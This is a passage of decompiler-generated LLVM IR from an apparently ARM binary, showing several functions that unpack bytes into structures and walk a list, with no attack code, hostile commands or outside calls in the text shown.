  %v2_1ce1c = inttoptr i32 %v1_1ce1c to i32*
  %v3_1ce1c = load i32, i32* %v2_1ce1c, align 4
  %v1_1ce20 = trunc i32 %v3_1ce1c to i8
  %v2_1ce20 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce20 = add i32 %v2_1ce20, 9
  %v4_1ce20 = inttoptr i32 %v3_1ce20 to i8*
  store i8 %v1_1ce20, i8* %v4_1ce20, align 1
  %v0_1ce24 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ce24 = add i32 %v0_1ce24, 45
  %v2_1ce24 = inttoptr i32 %v1_1ce24 to i8*
  %v3_1ce24 = load i8, i8* %v2_1ce24, align 1
  %v2_1ce28 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce28 = add i32 %v2_1ce28, 10
  %v4_1ce28 = inttoptr i32 %v3_1ce28 to i8*
  store i8 %v3_1ce24, i8* %v4_1ce28, align 1
  %v0_1ce2c = load i32, i32* %ip.global-to-local, align 4
  %v1_1ce2c = add i32 %v0_1ce2c, 44
  %v2_1ce2c = inttoptr i32 %v1_1ce2c to i32*
  %v3_1ce2c = load i32, i32* %v2_1ce2c, align 4
  %v1_1ce30 = trunc i32 %v3_1ce2c to i8
  %v2_1ce30 = load i32, i32* %lr.global-to-local, align 4
  %v3_1ce30 = add i32 %v2_1ce30, 11
  %v4_1ce30 = inttoptr i32 %v3_1ce30 to i8*
  store i8 %v1_1ce30, i8* %v4_1ce30, align 1
  %v2_1ce38.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1ce38

dec_label_pc_1ce38:                               ; preds = %dec_label_pc_1cd54, %bb17
  %v2_1ce38 = phi i32 [ %v2_1ce38.pre, %bb17 ], [ %v0_1cd58, %dec_label_pc_1cd54 ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %dec_label_pc_1cd54 ]
  store i32 %v2_1ce38, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1cd7c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder i32 45, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1ce38, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_1ce40(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1ce40:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1ce40 = load i8, i8* %arg1, align 1
  %v4_1ce40 = zext i8 %v3_1ce40 to i32
  %v2_1ce44 = add i32 %tmp, 1
  %v3_1ce44 = inttoptr i32 %v2_1ce44 to i8*
  %v4_1ce44 = load i8, i8* %v3_1ce44, align 1
  %v5_1ce44 = zext i8 %v4_1ce44 to i32
  %v4_1ce48 = mul nuw nsw i32 %v4_1ce40, 256
  %v5_1ce48 = or i32 %v5_1ce44, %v4_1ce48
  %v2_1ce4c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1ce48, i32* %v2_1ce4c, align 4
  %v2_1ce50 = add i32 %tmp, 2
  %v3_1ce50 = inttoptr i32 %v2_1ce50 to i8*
  %v4_1ce50 = load i8, i8* %v3_1ce50, align 1
  %tmp3 = icmp slt i8 %v4_1ce50, 0
  %v3_1ce54 = zext i1 %tmp3 to i32
  %v2_1ce58 = add i32 %arg2, 4
  %v3_1ce58 = inttoptr i32 %v2_1ce58 to i32*
  store i32 %v3_1ce54, i32* %v3_1ce58, align 4
  %v4_1ce5c = load i8, i8* %v3_1ce50, align 1
  %div = udiv i8 %v4_1ce5c, 8
  %tmp4 = urem i8 %div, 16
  %v1_1ce64 = zext i8 %tmp4 to i32
  %v2_1ce68 = add i32 %arg2, 8
  %v3_1ce68 = inttoptr i32 %v2_1ce68 to i32*
  store i32 %v1_1ce64, i32* %v3_1ce68, align 4
  %v4_1ce6c = load i8, i8* %v3_1ce50, align 1
  %div1 = udiv i8 %v4_1ce6c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_1ce74 = zext i8 %tmp5 to i32
  %v2_1ce78 = add i32 %arg2, 12
  %v3_1ce78 = inttoptr i32 %v2_1ce78 to i32*
  store i32 %v1_1ce74, i32* %v3_1ce78, align 4
  %v4_1ce7c = load i8, i8* %v3_1ce50, align 1
  %div2 = udiv i8 %v4_1ce7c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_1ce84 = zext i8 %tmp6 to i32
  %v2_1ce88 = add i32 %arg2, 16
  %v3_1ce88 = inttoptr i32 %v2_1ce88 to i32*
  store i32 %v1_1ce84, i32* %v3_1ce88, align 4
  %v4_1ce8c = load i8, i8* %v3_1ce50, align 1
  %tmp7 = urem i8 %v4_1ce8c, 2
  %v1_1ce90 = zext i8 %tmp7 to i32
  %v2_1ce94 = add i32 %arg2, 20
  %v3_1ce94 = inttoptr i32 %v2_1ce94 to i32*
  store i32 %v1_1ce90, i32* %v3_1ce94, align 4
  %v2_1ce98 = add i32 %tmp, 3
  %v3_1ce98 = inttoptr i32 %v2_1ce98 to i8*
  %v4_1ce98 = load i8, i8* %v3_1ce98, align 1
  %tmp8 = icmp slt i8 %v4_1ce98, 0
  %v3_1ce9c = zext i1 %tmp8 to i32
  %v2_1cea0 = add i32 %arg2, 24
  %v3_1cea0 = inttoptr i32 %v2_1cea0 to i32*
  store i32 %v3_1ce9c, i32* %v3_1cea0, align 4
  %v4_1cea4 = load i8, i8* %v3_1ce98, align 1
  %tmp9 = urem i8 %v4_1cea4, 16
  %v1_1cea8 = zext i8 %tmp9 to i32
  %v2_1ceac = add i32 %arg2, 28
  %v3_1ceac = inttoptr i32 %v2_1ceac to i32*
  store i32 %v1_1cea8, i32* %v3_1ceac, align 4
  %v2_1ceb0 = add i32 %tmp, 4
  %v3_1ceb0 = inttoptr i32 %v2_1ceb0 to i8*
  %v4_1ceb0 = load i8, i8* %v3_1ceb0, align 1
  %v5_1ceb0 = zext i8 %v4_1ceb0 to i32
  %v2_1ceb4 = add i32 %tmp, 5
  %v3_1ceb4 = inttoptr i32 %v2_1ceb4 to i8*
  %v4_1ceb4 = load i8, i8* %v3_1ceb4, align 1
  %v5_1ceb4 = zext i8 %v4_1ceb4 to i32
  %v4_1ceb8 = mul nuw nsw i32 %v5_1ceb0, 256
  %v5_1ceb8 = or i32 %v5_1ceb4, %v4_1ceb8
  %v2_1cebc = add i32 %arg2, 32
  %v3_1cebc = inttoptr i32 %v2_1cebc to i32*
  store i32 %v5_1ceb8, i32* %v3_1cebc, align 4
  %v2_1cec0 = add i32 %tmp, 6
  %v3_1cec0 = inttoptr i32 %v2_1cec0 to i8*
  %v4_1cec0 = load i8, i8* %v3_1cec0, align 1
  %v5_1cec0 = zext i8 %v4_1cec0 to i32
  %v2_1cec4 = add i32 %tmp, 7
  %v3_1cec4 = inttoptr i32 %v2_1cec4 to i8*
  %v4_1cec4 = load i8, i8* %v3_1cec4, align 1
  %v5_1cec4 = zext i8 %v4_1cec4 to i32
  %v4_1cec8 = mul nuw nsw i32 %v5_1cec0, 256
  %v5_1cec8 = or i32 %v5_1cec4, %v4_1cec8
  %v2_1cecc = add i32 %arg2, 36
  %v3_1cecc = inttoptr i32 %v2_1cecc to i32*
  store i32 %v5_1cec8, i32* %v3_1cecc, align 4
  %v2_1ced0 = add i32 %tmp, 8
  %v3_1ced0 = inttoptr i32 %v2_1ced0 to i8*
  %v4_1ced0 = load i8, i8* %v3_1ced0, align 1
  %v5_1ced0 = zext i8 %v4_1ced0 to i32
  %v2_1ced4 = add i32 %tmp, 9
  %v3_1ced4 = inttoptr i32 %v2_1ced4 to i8*
  %v4_1ced4 = load i8, i8* %v3_1ced4, align 1
  %v5_1ced4 = zext i8 %v4_1ced4 to i32
  %v4_1ced8 = mul nuw nsw i32 %v5_1ced0, 256
  %v5_1ced8 = or i32 %v5_1ced4, %v4_1ced8
  %v2_1cedc = add i32 %arg2, 40
  %v3_1cedc = inttoptr i32 %v2_1cedc to i32*
  store i32 %v5_1ced8, i32* %v3_1cedc, align 4
  %v2_1cee0 = add i32 %tmp, 11
  %v3_1cee0 = inttoptr i32 %v2_1cee0 to i8*
  %v4_1cee0 = load i8, i8* %v3_1cee0, align 1
  %v5_1cee0 = zext i8 %v4_1cee0 to i32
  %v2_1cee4 = add i32 %tmp, 10
  %v3_1cee4 = inttoptr i32 %v2_1cee4 to i8*
  %v4_1cee4 = load i8, i8* %v3_1cee4, align 1
  %v5_1cee4 = zext i8 %v4_1cee4 to i32
  %v4_1cee8 = mul nuw nsw i32 %v5_1cee4, 256
  %v5_1cee8 = or i32 %v4_1cee8, %v5_1cee0
  %v2_1ceec = add i32 %arg2, 44
  %v3_1ceec = inttoptr i32 %v2_1ceec to i32*
  store i32 %v5_1cee8, i32* %v3_1ceec, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 7, 8, 13, 14, 9, 34, 10, 11, 0, 12, 1, 18, 19, 20, 21, 22, 23, 15, 16, 17, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 2, 3, 4, 6, 5 }
  uselistorder i32 11, { 14, 15, 7, 8, 16, 9, 10, 11, 24, 17, 4, 5, 6, 18, 19, 20, 21, 22, 23, 0, 12, 3, 2, 1, 13 }
  uselistorder i32 40, { 7, 8, 10, 1, 11, 12, 2, 9, 4, 3, 0, 13, 14, 15, 16, 17, 5, 6 }
  uselistorder i32 36, { 19, 20, 23, 24, 25, 26, 8, 4, 7, 21, 0, 1, 9, 2, 5, 22, 10, 11, 12, 13, 14, 15, 16, 17, 3, 27, 28, 6, 18 }
  uselistorder i32 7, { 12, 13, 8, 0, 1, 6, 7, 2, 17, 14, 15, 16, 3, 4, 9, 10, 5, 11 }
  uselistorder i32 28, { 27, 4, 6, 5, 31, 32, 37, 39, 40, 7, 8, 38, 9, 10, 33, 41, 28, 52, 29, 30, 26, 42, 11, 1, 34, 35, 51, 36, 12, 13, 14, 15, 2, 43, 44, 45, 46, 47, 48, 49, 0, 50, 3, 20, 19, 17, 18, 23, 21, 22, 24, 16, 25 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1, 3 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @function_1cef4(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1cef4:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1cef4 = load i32, i32* @r4, align 4
  store i32 %v3_1cef4, i32* %stack_var_-16, align 4
  %v9_1cef4 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1cefc = load i32, i32* %arg1, align 4
  store i32 %v2_1cefc, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1cf08 = inttoptr i32 %v2_1cefc to i8*
  %v2_1cf08 = call i32 @function_1d228(i8* %v1_1cf08)
  store i32 %v2_1cf08, i32* %r0.global-to-local, align 4
  %v1_1cf0c = icmp slt i32 %v2_1cf08, 0
  br i1 %v1_1cf0c, label %dec_label_pc_1cf4c, label %dec_label_pc_1cf14

dec_label_pc_1cf14:                               ; preds = %dec_label_pc_1cef4
  %v1_1cf14 = load i32, i32* @r5, align 4
  %v2_1cf14 = sub i32 %v1_1cf14, %v2_1cf08
  %v7_1cf1c = icmp slt i32 %v2_1cf14, 4
  br i1 %v7_1cf1c, label %bb, label %dec_label_pc_1cf24

bb:                                               ; preds = %dec_label_pc_1cf14
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cf4c

dec_label_pc_1cf24:                               ; preds = %dec_label_pc_1cf14
  %v0_1cf24 = load i32, i32* @r4, align 4
  %v1_1cf24 = add i32 %v0_1cf24, 5
  %v2_1cf24 = inttoptr i32 %v1_1cf24 to i8*
  %v3_1cf24 = load i8, i8* %v2_1cf24, align 1
  %v2_1cf28 = load i32, i32* @r6, align 4
  %v4_1cf28 = add i32 %v2_1cf28, %v2_1cf08
  %v5_1cf28 = inttoptr i32 %v4_1cf28 to i8*
  store i8 %v3_1cf24, i8* %v5_1cf28, align 1
  %v0_1cf2c = load i32, i32* @r4, align 4
  %v1_1cf2c = add i32 %v0_1cf2c, 4
  %v2_1cf2c = inttoptr i32 %v1_1cf2c to i32*
  %v3_1cf2c = load i32, i32* %v2_1cf2c, align 4
  %v0_1cf30 = load i32, i32* @r6, align 4
  %v1_1cf30 = load i32, i32* %r0.global-to-local, align 4
  %v2_1cf30 = add i32 %v1_1cf30, %v0_1cf30
  store i32 %v2_1cf30, i32* %r2.global-to-local, align 4
  %v1_1cf34 = trunc i32 %v3_1cf2c to i8
  %v3_1cf34 = add i32 %v2_1cf30, 1
  %v4_1cf34 = inttoptr i32 %v3_1cf34 to i8*
  store i8 %v1_1cf34, i8* %v4_1cf34, align 1
  %v0_1cf38 = load i32, i32* @r4, align 4
  %v1_1cf38 = add i32 %v0_1cf38, 9
  %v2_1cf38 = inttoptr i32 %v1_1cf38 to i8*
  %v3_1cf38 = load i8, i8* %v2_1cf38, align 1
  %v2_1cf3c = load i32, i32* %r2.global-to-local, align 4
  %v3_1cf3c = add i32 %v2_1cf3c, 2
  %v4_1cf3c = inttoptr i32 %v3_1cf3c to i8*
  store i8 %v3_1cf38, i8* %v4_1cf3c, align 1
  %v0_1cf40 = load i32, i32* @r4, align 4
  %v1_1cf40 = add i32 %v0_1cf40, 8
  %v2_1cf40 = inttoptr i32 %v1_1cf40 to i32*
  %v3_1cf40 = load i32, i32* %v2_1cf40, align 4
  %v1_1cf44 = trunc i32 %v3_1cf40 to i8
  %v2_1cf44 = load i32, i32* %r2.global-to-local, align 4
  %v3_1cf44 = add i32 %v2_1cf44, 3
  %v4_1cf44 = inttoptr i32 %v3_1cf44 to i8*
  store i8 %v1_1cf44, i8* %v4_1cf44, align 1
  %v0_1cf48 = load i32, i32* %r0.global-to-local, align 4
  %v1_1cf48 = add i32 %v0_1cf48, 4
  store i32 %v1_1cf48, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cf4c

dec_label_pc_1cf4c:                               ; preds = %bb, %dec_label_pc_1cef4, %dec_label_pc_1cf24
  %v1_1cf50 = phi i32 [ -1, %bb ], [ %v2_1cf08, %dec_label_pc_1cef4 ], [ %v1_1cf48, %dec_label_pc_1cf24 ]
  %v2_1cf4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1cf4c, i32* @r4, align 4
  store i32 %v9_1cef4, i32* @r6, align 4
  ret i32 %v1_1cf50

; uselistorder directives
  uselistorder i32 %v2_1cf08, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 5, 3, 6, 0 }
  uselistorder i32 9, { 29, 30, 31, 34, 35, 16, 33, 32, 28, 23, 24, 17, 36, 1, 37, 43, 18, 19, 25, 38, 39, 40, 41, 20, 21, 22, 0, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 26, 27, 42 }
  uselistorder i32 5, { 17, 18, 19, 7, 14, 0, 8, 20, 9, 3, 15, 10, 4, 24, 1, 5, 21, 6, 2, 22, 23, 11, 12, 13, 16 }
  uselistorder label %dec_label_pc_1cf4c, { 2, 0, 1 }
}

define i32 @function_1cf54() local_unnamed_addr {
dec_label_pc_1cf54:
  store i32 ptrtoint ([11 x i8]* @global_var_23d34.1153 to i32), i32* @r0, align 4
  %v2_1cf6c = call i32 @function_17db0(i32 ptrtoint ([11 x i8]* @global_var_23d34.1153 to i32))
  ret i32 %v2_1cf6c

; uselistorder directives
  uselistorder i32 (i32)* @function_17db0, { 0, 2, 1 }
}

define i32 @function_1cf84() local_unnamed_addr {
dec_label_pc_1cf84:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1cf84 = load i32, i32* @r4, align 4
  %v6_1cf84 = load i32, i32* @r5, align 4
  %v9_1cf84 = load i32, i32* @r6, align 4
  %v12_1cf84 = load i32, i32* @r7, align 4
  %v15_1cf84 = load i32, i32* @r8, align 4
  %v18_1cf84 = load i32, i32* @sb, align 4
  %v21_1cf84 = load i32, i32* @sl, align 4
  %v24_1cf84 = load i32, i32* @fp, align 4
  store i32 %tmp11, i32* @r5, align 4
  store i32 %tmp10, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 180260, i32* @r4, align 4
  %v2_1cfac = inttoptr i32 %tmp10 to i32*
  store i32 -1, i32* %v2_1cfac, align 4
  %v0_1cfb0 = load i32, i32* @r0, align 4
  store i32 %v0_1cfb0, i32* @r6, align 4
  %v0_1cfb4 = load i32, i32* @r1, align 4
  %v0_1cfb8 = load i32, i32* @r2, align 4
  store i32 %v0_1cfb8, i32* @r8, align 4
  %v0_1cfbc = load i32, i32* @r3, align 4
  store i32 %v0_1cfbc, i32* @fp, align 4
  %v3_1cfc0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1cfc0, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp11, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_1cfcc

.thread:                                          ; preds = %dec_label_pc_1cf84
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1d16c

dec_label_pc_1cfcc:                               ; preds = %dec_label_pc_1cf84
  %v2_1cfcc = icmp eq i32 %v0_1cfb0, 0
  br i1 %v2_1cfcc, label %dec_label_pc_1cfd4, label %dec_label_pc_1cff4

dec_label_pc_1cfd4:                               ; preds = %dec_label_pc_1cfcc
  %v0_1cfd4 = call i32 @function_1cf54()
  store i32 %v0_1cfd4, i32* @r6, align 4
  %v2_1cfd8 = icmp eq i32 %v0_1cfd4, 0
  br i1 %v2_1cfd8, label %dec_label_pc_1cfe0, label %dec_label_pc_1cff4

dec_label_pc_1cfe0:                               ; preds = %dec_label_pc_1cfd4
  store i32 %tmp8, i32* %r2.global-to-local, align 4
  %v2_1cfe4 = inttoptr i32 %tmp8 to i32*
  store i32 0, i32* %v2_1cfe4, align 4
  %v0_1cfe8 = call i32 @function_12b24()
  %v1_1cfec = inttoptr i32 %v0_1cfe8 to i32*
  %v2_1cfec = load i32, i32* %v1_1cfec, align 4
  store i32 %v2_1cfec, i32* @sb, align 4
  br label %dec_label_pc_1d16c

dec_label_pc_1cff4:                               ; preds = %dec_label_pc_1cfd4, %dec_label_pc_1cfcc
  %v1_1d014 = phi i32 [ %v0_1cfd4, %dec_label_pc_1cfd4 ], [ %v0_1cfb0, %dec_label_pc_1cfcc ]
  store i32 ptrtoint ([4 x i8]* @global_var_23d40.1156 to i32), i32* @r4, align 4
  %v2_1cffc = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp7, i32* %ip.global-to-local, align 4
  store i32 %tmp7, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1d014 = add i32 %v1_1d014, 8
  %v3_1d014 = inttoptr i32 %v2_1d014 to i32*
  store i32 48, i32* %v3_1d014, align 4
  store i32 %tmp10, i32* %r3.global-to-local, align 4
  %v0_1d01c = load i32, i32* @r5, align 4
  %v1_1d01c = add i32 %v0_1d01c, -48
  store i32 %v1_1d01c, i32* %r1.global-to-local, align 4
  %v0_1d020 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d020 = add i32 %v0_1d020, 24
  store i32 %v1_1d020, i32* @ip, align 4
  %v0_1d024 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1d024, i32* @sb, align 4
  %v0_1d028 = load i32, i32* @lr, align 4
  %v1_1d028 = add i32 %v0_1d028, 32
  store i32 %v1_1d028, i32* @sl, align 4
  %v1_1d02c = load i32, i32* @r6, align 4
  %v2_1d02c = add i32 %v1_1d02c, 16
  %v3_1d02c = inttoptr i32 %v2_1d02c to i32*
  store i32 %v1_1d01c, i32* %v3_1d02c, align 4
  %v0_1d030 = load i32, i32* @r4, align 4
  %v0_1d034 = load i32, i32* @ip, align 4
  store i32 %v0_1d034, i32* %stack_var_-64, align 4
  %v0_1d038 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d038 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d038 = inttoptr i32 %v1_1d038 to i32*
  store i32 %v0_1d038, i32* %v2_1d038, align 4
  %v0_1d03c = load i32, i32* @lr, align 4
  %v1_1d03c = load i32, i32* @r6, align 4
  %v2_1d03c = add i32 %v1_1d03c, 4
  %v3_1d03c = inttoptr i32 %v2_1d03c to i32*
  store i32 %v0_1d03c, i32* %v3_1d03c, align 4
  %v2_1d06c = inttoptr i32 %v0_1cfb4 to i8*
  br label %dec_label_pc_1d140

dec_label_pc_1d044:                               ; preds = %dec_label_pc_1d140
  %v3_1d044 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d044, i32* %r1.global-to-local, align 4
  %v0_1d048 = load i32, i32* @fp, align 4
  %v7_1d048 = icmp eq i32 %v0_1d048, 1
  %v1_1d04c = add i32 %v3_1d044, 4
  store i32 %v1_1d04c, i32* @r5, align 4
  %v1_1d050 = load i32, i32* @r7, align 4
  %v2_1d050 = add i32 %v1_1d050, 4
  %v3_1d050 = inttoptr i32 %v2_1d050 to i32*
  store i32 %v1_1d04c, i32* %v3_1d050, align 4
  br i1 %v7_1d048, label %dec_label_pc_1d16c, label %dec_label_pc_1d058

dec_label_pc_1d058:                               ; preds = %dec_label_pc_1d044
  %v0_1d058 = load i32, i32* @fp, align 4
  %v7_1d058 = icmp eq i32 %v0_1d058, 2
  br i1 %v7_1d058, label %dec_label_pc_1d064, label %dec_label_pc_1d088.preheader

dec_label_pc_1d088.preheader:                     ; preds = %dec_label_pc_1d058
  %v1_1d05c = load i32, i32* @r5, align 4
  %v1_1d08826 = inttoptr i32 %v1_1d05c to i32*
  %v2_1d08827 = load i32, i32* %v1_1d08826, align 4
  store i32 %v2_1d08827, i32* %r3.global-to-local, align 4
  store i32 %v2_1d08827, i32* %r1.global-to-local, align 4
  %v2_1d08c29 = icmp eq i32 %v2_1d08827, 0
  %v1_1d09430 = add i32 %v1_1d05c, 4
  store i32 %v1_1d09430, i32* @r4, align 4
  br i1 %v2_1d08c29, label %dec_label_pc_1d140, label %dec_label_pc_1d07c

dec_label_pc_1d064:                               ; preds = %dec_label_pc_1d058
  %v0_1d064 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d064 = inttoptr i32 %v0_1d064 to i32*
  %v2_1d064 = load i32, i32* %v1_1d064, align 4
  store i32 %v2_1d064, i32* @r1, align 4
  %v3_1d06c = call i32 @function_13fe0(i8* %v2_1d06c, i32 %v2_1d064)
  %v2_1d070 = icmp eq i32 %v3_1d06c, 0
  br i1 %v2_1d070, label %dec_label_pc_1d0a0, label %dec_label_pc_1d140

dec_label_pc_1d07c:                               ; preds = %dec_label_pc_1d088.preheader, %dec_label_pc_1d07c.dec_label_pc_1d088_crit_edge
  %v2_1d08831 = phi i32 [ %v2_1d088, %dec_label_pc_1d07c.dec_label_pc_1d088_crit_edge ], [ %v2_1d08827, %dec_label_pc_1d088.preheader ]
  %v3_1d07c = call i32 @function_1d1bc(i8* %v2_1d06c, i32 %v2_1d08831)
  %v2_1d080 = icmp eq i32 %v3_1d07c, 0
  br i1 %v2_1d080, label %dec_label_pc_1d0a0, label %dec_label_pc_1d07c.dec_label_pc_1d088_crit_edge

dec_label_pc_1d07c.dec_label_pc_1d088_crit_edge:  ; preds = %dec_label_pc_1d07c
  %v0_1d088.pre = load i32, i32* @r4, align 4
  %v1_1d088 = inttoptr i32 %v0_1d088.pre to i32*
  %v2_1d088 = load i32, i32* %v1_1d088, align 4
  store i32 %v2_1d088, i32* %r3.global-to-local, align 4
  store i32 %v2_1d088, i32* %r1.global-to-local, align 4
  %v2_1d08c = icmp eq i32 %v2_1d088, 0
  %v1_1d094 = add i32 %v0_1d088.pre, 4
  store i32 %v1_1d094, i32* @r4, align 4
  br i1 %v2_1d08c, label %dec_label_pc_1d140, label %dec_label_pc_1d07c

dec_label_pc_1d0a0:                               ; preds = %dec_label_pc_1d07c, %dec_label_pc_1d064
  %v0_1d0a0 = load i32, i32* @r5, align 4
  %v1_1d0a0 = inttoptr i32 %v0_1d0a0 to i32*
  %v2_1d0a0 = load i32, i32* %v1_1d0a0, align 4
  store i32 %v2_1d0a0, i32* %r3.global-to-local, align 4
  %v4_1d0a0 = add i32 %v0_1d0a0, 4
  store i32 %v4_1d0a0, i32* @r5, align 4
  %v2_1d0a4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1d0a4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1d0ac = load i32, i32* @r7, align 4
  %v2_1d0ac = inttoptr i32 %v1_1d0ac to i32*
  store i32 %v2_1d0a0, i32* %v2_1d0ac, align 4
  %v0_1d0b0 = load i32, i32* @lr, align 4
  %v1_1d0b0 = load i32, i32* @ip, align 4
  %v2_1d0b0 = add i32 %v1_1d0b0, 4
  %v3_1d0b0 = inttoptr i32 %v2_1d0b0 to i32*
  store i32 %v0_1d0b0, i32* %v3_1d0b0, align 4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v0_1d0b8 = load i32, i32* @r8, align 4
  %v7_1d0b8 = icmp eq i32 %v0_1d0b8, 2
  %v0_1d0bc = load i32, i32* @r5, align 4
  %v1_1d0bc = load i32, i32* @r7, align 4
  %v2_1d0bc = add i32 %v1_1d0bc, 4
  %v3_1d0bc = inttoptr i32 %v2_1d0bc to i32*
  store i32 %v0_1d0bc, i32* %v3_1d0bc, align 4
  %v0_1d0c0 = load i32, i32* @ip, align 4
  %v1_1d0c0 = load i32, i32* @r7, align 4
  %v2_1d0c0 = add i32 %v1_1d0c0, 16
  %v3_1d0c0 = inttoptr i32 %v2_1d0c0 to i32*
  store i32 %v0_1d0c0, i32* %v3_1d0c0, align 4
  %v0_1d0c4 = load i32, i32* @sl, align 4
  %v1_1d0c4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d0c4 = add i32 %v1_1d0c4, 24
  %v3_1d0c4 = inttoptr i32 %v2_1d0c4 to i32*
  store i32 %v0_1d0c4, i32* %v3_1d0c4, align 4
  br i1 %v7_1d0b8, label %dec_label_pc_1d0cc, label %dec_label_pc_1d0fc

dec_label_pc_1d0cc:                               ; preds = %dec_label_pc_1d0a0
  %v3_1d0cc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d0cc, i32* %r3.global-to-local, align 4
  %v0_1d0d0 = load i32, i32* @r8, align 4
  %v1_1d0d4 = inttoptr i32 %v3_1d0cc to i32*
  %v2_1d0d4 = load i32, i32* %v1_1d0d4, align 4
  store i32 %v2_1d0d4, i32* %r1.global-to-local, align 4
  %v0_1d0d8 = load i32, i32* @sl, align 4
  store i32 %v0_1d0d8, i32* %r2.global-to-local, align 4
  %v3_1d0dc = inttoptr i32 %v2_1d0d4 to i8*
  %v4_1d0dc = call i32 @function_1b3f8(i32 %v0_1d0d0, i8* %v3_1d0dc, i32 %v0_1d0d8)
  %tmp24 = icmp slt i32 %v4_1d0dc, 1
  br i1 %tmp24, label %dec_label_pc_1d13c, label %dec_label_pc_1d0e8

dec_label_pc_1d0e8:                               ; preds = %dec_label_pc_1d0cc
  %v0_1d0ec = load i32, i32* @r7, align 4
  %v2_1d0ec = inttoptr i32 %tmp8 to i32*
  store i32 %v0_1d0ec, i32* %v2_1d0ec, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1d0f4 = load i32, i32* @r8, align 4
  %v1_1d0f4 = load i32, i32* @r7, align 4
  %v2_1d0f4 = add i32 %v1_1d0f4, 8
  %v3_1d0f4 = inttoptr i32 %v2_1d0f4 to i32*
  store i32 %v0_1d0f4, i32* %v3_1d0f4, align 4
  %v0_1d134.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d130

dec_label_pc_1d0fc:                               ; preds = %dec_label_pc_1d0a0
  %v0_1d0fc = load i32, i32* @r8, align 4
  %v7_1d0fc = icmp eq i32 %v0_1d0fc, 10
  br i1 %v7_1d0fc, label %dec_label_pc_1d104, label %dec_label_pc_1d13c

dec_label_pc_1d104:                               ; preds = %dec_label_pc_1d0fc
  %v3_1d104 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d104, i32* %r3.global-to-local, align 4
  %v1_1d10c = inttoptr i32 %v3_1d104 to i32*
  %v2_1d10c = load i32, i32* %v1_1d10c, align 4
  store i32 %v2_1d10c, i32* %r1.global-to-local, align 4
  %v0_1d110 = load i32, i32* @sl, align 4
  store i32 %v0_1d110, i32* %r2.global-to-local, align 4
  %v3_1d114 = inttoptr i32 %v2_1d10c to i8*
  %v4_1d114 = call i32 @function_1b3f8(i32 10, i8* %v3_1d114, i32 %v0_1d110)
